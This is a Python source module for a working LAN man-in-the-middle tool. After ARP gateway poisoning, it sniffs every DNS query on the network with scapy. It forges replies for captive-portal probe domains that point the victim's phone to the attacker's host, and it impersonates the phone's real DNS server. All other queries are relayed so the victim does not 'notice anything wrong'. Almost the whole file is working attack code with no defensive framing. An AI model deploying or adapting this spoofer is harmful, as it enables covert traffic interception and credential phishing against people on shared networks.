"""
Raw-wire DNS responder — passive scapy sniffer that captures *every*
UDP/53 packet on the LAN (regardless of destination IP) and spoofs
replies for captive-portal probe domains.

Why this is needed
==================
When ARP gateway impersonation succeeds, the victim phone sends its DNS
query addressed to its DHCP-supplied DNS server (e.g. 168.126.63.1 KT).
The packet arrives at our NIC because the phone routes it via the
poisoned "gateway", but the kernel does NOT deliver it to our
bound-port-53 listener because the dst IP is not ours.  So a port-53
listener alone misses every phone CPD probe.

The fix is to operate at L2: sniff via Npcap, craft a spoofed reply
with src IP = the queried DNS server (so the phone's stack accepts it),
and sendp() back over the wire.  This is the standard mitm6 / dsniff /
bettercap approach.

Non-CPD queries are forwarded to a real upstream and the reply is
re-spoofed back too — keeping the phone's internet alive so it doesn't
fall back to mobile data and notice anything wrong.
"""

from __future__ import annotations

import asyncio
import socket
import struct
import threading
import time
from dataclasses import dataclass, field
from typing import Any

from app.logging_setup import get_logger
from app.services.aggressive_mode import (
    CPD_DOMAINS_FROZEN,
    _parse_qname,
)

log = get_logger("dns_responder")


def _build_dns_reply_payload(query: bytes, ip: str) -> bytes:
    """Same as the bound-port version but reused here for spoofed sends."""
    txid = query[:2]
    flags = b"\x81\x80"
    qd = query[4:6]
    an = b"\x00\x01"
    ns_ar = b"\x00\x00\x00\x00"
    qsection = query[12:]
    ans = (
        b"\xc0\x0c"
        b"\x00\x01\x00\x01"
        b"\x00\x00\x00\x1e"
        b"\x00\x04"
        + socket.inet_aton(ip)
    )
    return txid + flags + qd + an + ns_ar + qsection + ans


@dataclass(slots=True)
class DnsResponder:
    """L2 sniff + spoofed reply for UDP/53 traffic on the LAN."""
    our_ip: str
    our_mac: str
    iface: str
    upstream: str = "1.1.1.1"
    extra_hijack_domains: tuple[str, ...] = ()

    seen: int = field(default=0, init=False)
    hijacked: int = field(default=0, init=False)
    forwarded: int = field(default=0, init=False)
    sources: dict[str, int] = field(default_factory=dict, init=False)
    _raw_seen: int = field(default=0, init=False)

    _thread: threading.Thread | None = field(default=None, init=False, repr=False)
    _stop: threading.Event = field(default_factory=threading.Event, init=False)
    _loop: asyncio.AbstractEventLoop | None = field(default=None, init=False)

    async def start(self) -> None:
        self._loop = asyncio.get_running_loop()
        self._stop.clear()
        self._thread = threading.Thread(
            target=self._run_sniffer, name="dns-responder", daemon=True,
        )
        self._thread.start()
        log.info("dns_responder.start", iface=self.iface, our_ip=self.our_ip)

    async def stop(self) -> None:
        self._stop.set()
        # scapy sniff with stop_filter checks self._stop -- give it a tick

    def _is_hijack(self, qname: str) -> bool:
        d = qname.lower().rstrip(".")
        all_doms = CPD_DOMAINS_FROZEN + tuple(self.extra_hijack_domains)
        return any(d == probe or d.endswith("." + probe) for probe in all_doms)

    def _run_sniffer(self) -> None:
        from scapy.all import sniff, IP, UDP, DNS, Ether, sendp  # type: ignore[import-not-found]

        # diagnostic counter — fires for EVERY packet our sniff() callback
        # sees, before any filtering. If this stays at 0 while we know DNS
        # traffic is on the wire, the issue is iface / thread / Npcap, not
        # our parsing logic.
        def cb(pkt) -> None:
            try:
                self._raw_seen += 1
                if self._raw_seen <= 5 or self._raw_seen % 100 == 0:
                    log.info("dns_responder.tap",
                             n=self._raw_seen, summary=pkt.summary()[:90])
                if not (pkt.haslayer(IP) and pkt.haslayer(UDP) and pkt.haslayer(DNS)):
                    return
                udp = pkt[UDP]
                if udp.dport != 53:                # only DNS queries (not replies)
                    return
                ip_layer = pkt[IP]
                if ip_layer.src == self.our_ip:    # ignore our own forwards
                    return
                dns = pkt[DNS]
                if dns.qr != 0 or dns.qd is None:  # only standard queries
                    return

                self.seen += 1
                self.sources[ip_layer.src] = self.sources.get(ip_layer.src, 0) + 1

                qname = (dns.qd.qname or b"").decode("ascii", errors="replace").rstrip(".")
                if self._is_hijack(qname):
                    self.hijacked += 1
                    reply_payload = _build_dns_reply_payload(bytes(pkt[UDP].payload), self.our_ip)
                    self._spoof_reply(
                        reply_payload, pkt, sendp_fn=sendp, ether=Ether, ip_cls=IP, udp_cls=UDP,
                    )
                    log.info("dns_responder.hijack",
                             src=ip_layer.src, dst=ip_layer.dst, q=qname)
                else:
                    # Forward to upstream and spoof the reply back
                    self.forwarded += 1
                    try:
                        up = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                        up.settimeout(2.0)
                        up.sendto(bytes(pkt[UDP].payload), (self.upstream, 53))
                        rdata, _ = up.recvfrom(1500)
                        up.close()
                        self._spoof_reply(
                            rdata, pkt, sendp_fn=sendp, ether=Ether, ip_cls=IP, udp_cls=UDP,
                        )
                    except Exception as e:
                        log.debug("dns_responder.fwd_fail", err=str(e))
            except Exception as e:
                log.debug("dns_responder.cb_err", err=str(e))

        try:
            sniff(
                iface=self.iface,
                filter="udp port 53",
                prn=cb,
                store=0,
                stop_filter=lambda _p: self._stop.is_set(),
            )
        except Exception as e:
            log.error("dns_responder.sniff_crash", err=str(e))

    def _spoof_reply(self, dns_payload: bytes, original, *, sendp_fn, ether, ip_cls, udp_cls) -> None:
        """Build a fake reply packet pretending to come from the DNS
        server the phone actually queried."""
        # Reverse src/dst at every layer
        eth_src = self.our_mac
        eth_dst = original[ether].src
        ip_src  = original["IP"].dst          # pretend to be the queried DNS
        ip_dst  = original["IP"].src          # back to the phone
        udp_sport = 53
        udp_dport = original[udp_cls].sport

        pkt = (
            ether(src=eth_src, dst=eth_dst)
            / ip_cls(src=ip_src, dst=ip_dst, ttl=64)
            / udp_cls(sport=udp_sport, dport=udp_dport)
            / dns_payload
        )
        sendp_fn(pkt, iface=self.iface, verbose=False)

    @property
    def stats(self) -> dict[str, Any]:
        return {
            "iface": self.iface,
            "our_ip": self.our_ip,
            "seen": self.seen,
            "hijacked": self.hijacked,
            "forwarded": self.forwarded,
            "top_sources": dict(sorted(self.sources.items(), key=lambda x: -x[1])[:5]),
        }


_RESP: DnsResponder | None = None


def get_dns_responder(*, our_ip: str, our_mac: str, iface: str,
                     upstream: str = "1.1.1.1") -> DnsResponder:
    global _RESP
    if _RESP is None:
        _RESP = DnsResponder(
            our_ip=our_ip, our_mac=our_mac, iface=iface, upstream=upstream,
        )
    return _RESP
